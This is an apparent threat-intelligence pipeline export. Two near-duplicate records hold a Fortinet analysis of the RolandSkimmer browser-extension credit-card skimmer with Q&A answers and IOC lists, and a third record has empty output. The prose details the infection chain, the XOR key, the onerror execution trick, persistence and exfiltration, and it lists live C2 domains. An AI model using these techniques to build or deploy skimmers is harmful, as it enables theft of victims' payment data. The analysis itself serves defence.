{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically using malicious browser extensions across Chrome, Edge, and Firefox.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information. While it's not specifically referred to as a wallet stealer, it has similar goals of stealing financial information.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["banking trojan", "botnet", "intelligence", "analysis", "browser", "apt", "threat", "bank", "malicious", "phishing"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users in Bulgaria and leverages malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria. There is no specific mention of targeted banks or wallets, but the malware is designed to steal credit card information, including Visa and MasterCard numbers.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["analysis", "botnet", "apt", "banking trojan", "browser", "bank", "phishing", "malicious", "threat", "intelligence"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/russian-hackers-exploit-email-and-vpn.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
